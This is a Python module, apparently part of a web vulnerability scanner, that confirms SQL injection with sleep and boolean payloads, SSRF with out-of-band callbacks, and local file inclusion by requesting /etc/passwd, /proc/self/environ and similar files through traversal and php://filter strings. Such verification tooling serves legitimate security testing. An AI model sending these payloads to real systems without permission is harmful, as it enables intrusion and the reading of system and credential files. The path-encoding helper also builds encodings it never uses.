import statistics
import time
from typing import Dict, Optional

import requests

from engine.config import DEFAULT_THRESHOLDS
from engine.oob import OfflineOOBJudge
from tools.http_client import build_url
from tools.log_utils import get_logger
from tools.response_profiler import CLEAN_VALUE

logger = get_logger("robust_verifier")


def verify_sqli_timeblind(url: str, param: str, sess: requests.Session,
                           timeout: float = 15.0) -> Dict:
    result = {"vulnerable": False, "method": "time_blind", "confidence": 0.0, "evidence": []}
    baseline = _measure_baseline_ms(url, param, sess, timeout)
    if baseline is None or baseline > timeout * 800:
        return result

    sleep_payloads = [
        ("mysql", ["' OR SLEEP(%d)--", "' OR IF(1=1,SLEEP(%d),0)--", "1' AND SLEEP(%d)--"]),
        ("mysql", ['" OR SLEEP(%d)--', '" AND SLEEP(%d)--']),
        ("postgres", ["' OR PG_SLEEP(%d)--", "' OR (SELECT PG_SLEEP(%d))--"]),
        ("mssql", ["'; WAITFOR DELAY '0:0:%d'--", "1'; WAITFOR DELAY '0:0:%d'--"]),
        ("oracle", ["' OR DBMS_PIPE.RECEIVE_MESSAGE('x',%d)--", "' AND DBMS_PIPE.RECEIVE_MESSAGE('x',%d)--"]),
    ]

    delays = [3, 5, 7]
    confirmed = 0
    dbms_hint = None
    th = DEFAULT_THRESHOLDS
    for dbms, templates in sleep_payloads:
        for delay in delays:
            threshold = max(delay * 900, baseline * th.latency_ratio + th.latency_margin_ms)
            for tmpl in templates:
                payload = tmpl % delay
                try:
                    start = time.time()
                    sess.get(build_url(url, param, payload), timeout=timeout + 3)
                    elapsed_ms = (time.time() - start) * 1000
                    if elapsed_ms >= threshold:
                        confirmed += 1
                        dbms_hint = dbms
                        result["evidence"].append({
                            "type": "time_delay",
                            "dbms": dbms,
                            "payload": payload[:50],
                            "elapsed_ms": round(elapsed_ms, 1),
                            "threshold_ms": round(threshold, 1),
                        })
                        break
                except requests.Timeout:
                    confirmed += 1
                    dbms_hint = dbms
                    result["evidence"].append({"type": "timeout", "dbms": dbms, "payload": payload[:50]})
                except Exception:
                    continue
            if confirmed > 0:
                break
        if confirmed > 0:
            break

    if confirmed >= 2:
        result["vulnerable"] = True
        result["confidence"] = min(0.95, 0.5 + confirmed * 0.15)
        result["dbms"] = dbms_hint
    elif confirmed >= 1:
        result["vulnerable"] = True
        result["confidence"] = 0.4
        result["dbms"] = dbms_hint
    return result


def verify_sqli_boolean(url: str, param: str, sess: requests.Session,
                         timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "method": "boolean", "confidence": 0.0, "evidence": []}
    baseline_resp = _get_baseline_response(url, param, sess, timeout)
    if not baseline_resp:
        return result
    len(baseline_resp.text)

    boolean_pairs = [
        ("1=1", "1=2"),
        ("' OR '1'='1", "' OR '1'='2"),
        ('" OR "1"="1', '" OR "1"="2'),
        ("AND 1=1", "AND 1=2"),
        ("' AND '1'='1", "' AND '1'='2"),
    ]
    confirmed = 0
    for true_cond, false_cond in boolean_pairs:
        try:
            r_true = sess.get(build_url(url, param, true_cond), timeout=timeout)
            r_false = sess.get(build_url(url, param, false_cond), timeout=timeout)
            diff = abs(len(r_true.text) - len(r_false.text))
            max_len = max(len(r_true.text), len(r_false.text), 1)
            ratio = diff / max_len
            if ratio > 0.03 and diff > 50:
                confirmed += 1
                result["evidence"].append({
                    "type": "boolean_diff",
                    "true_cond": true_cond,
                    "false_cond": false_cond,
                    "len_true": len(r_true.text),
                    "len_false": len(r_false.text),
                })
        except Exception:
            continue

    if confirmed >= 2:
        result["vulnerable"] = True
        result["confidence"] = min(0.9, 0.3 + confirmed * 0.2)
    elif confirmed >= 1:
        result["vulnerable"] = True
        result["confidence"] = 0.35
    return result


def verify_ssrf_oob(url: str, param: str, sess: requests.Session,
                     timeout: float = 10.0, oob_server=None) -> Dict:
    result = {"vulnerable": False, "method": "oob_double_check", "confidence": 0.0, "evidence": []}
    if oob_server is None:
        try:
            from tools.oob_server import OOBServer
            oob_server = OOBServer.get_instance()
        except Exception:
            oob_server = None

    cb_id = None
    if oob_server is not None:
        try:
            cb_id = oob_server.register("ssrf_oob_check")
        except Exception:
            cb_id = None

    oob_url = oob_server.get_callback_url(cb_id) if cb_id else None
    oob_domain = oob_server.get_callback_domain(cb_id) if cb_id else None

    targets = []
    for p in (oob_url, oob_domain,
              ("http://%s" % oob_domain) if oob_domain else None,
              ("https://%s" % oob_domain) if oob_domain else None):
        if p:
            targets.append(p)

    probes = []
    for p in targets:
        sample = _probe_ssrf(url, param, p, sess, timeout)
        probes.append({"label": p[:30], **sample})

    control = _probe_ssrf(url, param, OfflineOOBJudge.blackhole_control(), sess, timeout)

    if cb_id:
        time.sleep(DEFAULT_THRESHOLDS.oob_callback_wait_s)
        callbacks = oob_server.pop_callbacks(cb_id)
    else:
        callbacks = []

    if callbacks:
        result["vulnerable"] = True
        result["confidence"] = 0.95
        result["evidence"] = [{"type": "oob_callback", "count": len(callbacks), "details": str(callbacks[:3])}]
        result["method"] = "oob_confirmed"
        return result

    # 无回调：绝不凭「请求已发出/状态码非5xx」下结论，交给离线差分判定。
    offline = OfflineOOBJudge().judge(probes, control=control)
    result["offline_oob"] = offline
    if offline["status"] == "suspected_offline":
        result["vulnerable"] = True
        result["confidence"] = offline["confidence"]
        result["evidence"] = offline["evidence"]
        result["note"] = offline["note"]
        result["method"] = "offline_differential"
    else:
        result["vulnerable"] = False
        result["confidence"] = 0.0
        result["evidence"] = offline["evidence"]
        result["note"] = offline["note"] or "No OOB callback and no offline differential; inconclusive."
    return result


def _probe_ssrf(url: str, param: str, target: str, sess: requests.Session,
                timeout: float) -> Dict:
    sample = {"responded": False, "status": 0, "length": 0, "elapsed_ms": 0}
    if not target:
        return sample
    start = time.time()
    try:
        r = sess.get(build_url(url, param, target), timeout=timeout)
        sample["responded"] = True
        sample["status"] = r.status_code
        sample["length"] = len(r.text)
    except Exception:
        sample["responded"] = False
    finally:
        sample["elapsed_ms"] = round((time.time() - start) * 1000, 1)
    return sample


def verify_lfi_content(url: str, param: str, sess: requests.Session,
                        timeout: float = 10.0) -> Dict:
    result = {"vulnerable": False, "method": "content_extraction", "confidence": 0.0, "evidence": []}
    known_signatures = {
        "/etc/passwd": [("root:", 0.9), ("nobody:", 0.8), ("/bin/bash", 0.7), ("/bin/sh", 0.7)],
        "/etc/issue": [("Ubuntu", 0.6), ("Debian", 0.6), ("CentOS", 0.6), ("Kali", 0.6)],
        "/etc/hostname": [(chr(10), 0.3)],
        "/proc/self/environ": [("PATH=", 0.8), ("HOME=", 0.7), ("USER=", 0.7)],
        "/proc/version": [("Linux version", 0.9), ("gcc version", 0.7)],
        "/etc/nginx/nginx.conf": [("worker_processes", 0.8), ("http {", 0.7)],
        "/etc/apache2/apache2.conf": [("ServerRoot", 0.7), ("<Directory", 0.6)],
        "c:/windows/win.ini": [("[fonts]", 0.9), ("[extensions]", 0.8)],
        "c:/windows/system32/drivers/etc/hosts": [("localhost", 0.6)],
        "c:/xampp/php/php.ini": [("PHP", 0.6)],
    }

    confirmed = 0
    max_confidence = 0.0
    for filepath, signatures in known_signatures.items():
        try:
            r = sess.get(build_url(url, param, _lfi_encode_path(filepath)), timeout=timeout)
            if r.status_code == 200 and len(r.text) > 20:
                for pattern, weight in signatures:
                    if pattern in r.text:
                        confirmed += 1
                        confidence = max(max_confidence, weight)
                        max_confidence = max(max_confidence, confidence)
                        result["evidence"].append({
                            "file": filepath,
                            "pattern": pattern[:50],
                            "confidence": weight,
                            "preview": r.text[:150].strip(),
                        })
                        if confirmed >= 3:
                            break
                if confirmed >= 3:
                    break
        except Exception:
            continue

    if confirmed >= 2:
        result["vulnerable"] = True
        result["confidence"] = min(0.95, max_confidence + confirmed * 0.1)
    elif confirmed == 1:
        result["vulnerable"] = True
        result["confidence"] = max_confidence
    return result


def _measure_baseline_ms(url: str, param: str, sess: requests.Session,
                          timeout: float) -> Optional[float]:
    samples = []
    for _ in range(3):
        try:
            start = time.time()
            sess.get(build_url(url, param, CLEAN_VALUE), timeout=timeout)
            samples.append(time.time() - start)
        except Exception:
            pass
    if not samples:
        return None
    return statistics.median(samples) * 1000 if len(samples) >= 3 else (sum(samples) / len(samples)) * 1000


def _get_baseline_response(url: str, param: str, sess: requests.Session,
                            timeout: float) -> Optional[requests.Response]:
    try:
        return sess.get(build_url(url, param, CLEAN_VALUE), timeout=timeout)
    except Exception:
        return None


def _lfi_encode_path(path: str) -> str:
    encodings = [path, path.replace("/", "%2f"), path.replace("/", "%252f")]
    for p in path.split("/"):
        if p:
            encodings.append(path.replace(p, "..;/" + p, 1))
    if path.startswith("/"):
        encodings.append("....//....//....//...." + path)
        encodings.append("..\\..\\..\\.." + path.replace("/", "\\"))
        encodings.append("..%2f..%2f..%2f..%2f" + path[1:])
        php_filter = "php://filter/convert.base64-encode/resource=" + path
        encodings.append(php_filter)
    return encodings[0]


def verify_finding(vtype: str, url: str, param: str, sess: requests.Session,
                    timeout: float, oob_server=None) -> Dict:
    if vtype == "sqli":
        tb = verify_sqli_timeblind(url, param, sess, timeout)
        bl = verify_sqli_boolean(url, param, sess, timeout)
        combined = {"vulnerable": tb["vulnerable"] or bl["vulnerable"],
                     "confidence": max(tb["confidence"], bl["confidence"]),
                     "method": "combined",
                     "dbms": tb.get("dbms") or bl.get("dbms"),
                     "sub_checks": {"time_blind": tb, "boolean": bl},
                     "evidence": tb.get("evidence", []) + bl.get("evidence", [])}
        return combined
    elif vtype == "ssrf":
        return verify_ssrf_oob(url, param, sess, timeout, oob_server)
    elif vtype == "lfi":
        return verify_lfi_content(url, param, sess, timeout)
    return {"vulnerable": False, "confidence": 0.0, "method": "unknown"}
